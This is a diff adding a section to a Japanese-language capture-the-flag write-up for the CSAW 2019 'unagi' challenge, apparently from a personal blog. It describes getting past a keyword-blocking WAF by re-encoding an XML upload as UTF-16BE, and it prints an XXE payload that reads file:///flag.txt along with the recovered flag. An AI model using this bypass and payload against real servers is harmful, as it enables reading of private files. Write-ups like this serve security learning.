@@ -267,6 +267,40 @@ idxs<span style="color:#666">.</span>each <span style="color:#008000;font-weight
 <li><strong>flag{csp_will_solve_EVERYTHING}</strong></li>
 </ul>
 
+<h3 id="unagi">unagi</h3>
+
+<ul>
+<li>解けなかったのでwriteupを見た</li>
+<li>XMLがアップロードできるので、XXEだとわかるが、WAFがありいくつかのキーワード(ENTITYやSYSTEMなど)が使えない
+
+<ul>
+<li>PUBLIC は使えたりした</li>
+</ul></li>
+<li>結論としては、UTF-8ではなくUTF-16BEでアップロードすればWAFをBypassできるというものだった
+
+<ul>
+<li>試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい</li>
+</ul></li>
+<li><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする
+<code>xml
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY pass SYSTEM &quot;file:///flag.txt&quot;&gt;
+]&gt;
+&lt;users&gt;
+&lt;user&gt;
+&lt;username&gt;alice2&lt;/username&gt;
+&lt;password&gt;passwd1&lt;/password&gt;
+&lt;name&gt;Alice2&lt;/name&gt;
+&lt;email&gt;alice2@fakesite.com&lt;/email&gt;
+&lt;group&gt;CSAW2019&lt;/group&gt;
+&lt;intro&gt;&amp;pass;&lt;/intro&gt;
+&lt;/user&gt;
+&lt;/users&gt;
+</code></li>
+<li><strong>flag{n0w_i&rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}</strong></li>
+</ul>
+
   
 </article>
 
